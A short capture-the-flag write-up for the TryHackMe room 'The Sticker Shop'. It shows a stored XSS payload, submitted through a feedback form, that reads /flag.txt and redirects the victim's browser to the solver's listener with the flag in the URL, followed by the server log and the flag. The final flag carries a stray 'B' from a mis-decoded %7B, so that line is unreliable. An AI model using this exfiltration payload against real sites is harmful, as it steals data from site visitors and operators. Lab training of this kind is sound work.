https://tryhackme.com/r/room/thestickershop

Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!

Can you read the flag at `http://10.10.216.148:8080/flag.txt`[](http://10.10.216.148:8080/flag.txt)?

```
http://10.10.216.148:8080/submit_feedback

terminal 
python3 -m http.server 8081

feedback form
<img src='http://10.10.85.133'>

<script>
fetch('/flag.txt')
.then(response => response.text())
.then(data => {
	window.location.href = 'http://10.10.85.133:8081/receive?flag=' + encodeURIComponent(data);
});
</script>

"GET /receive?flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1" 404 -

THM{B83789a69074f636f64a38879cfcabe8b62305ee6}
```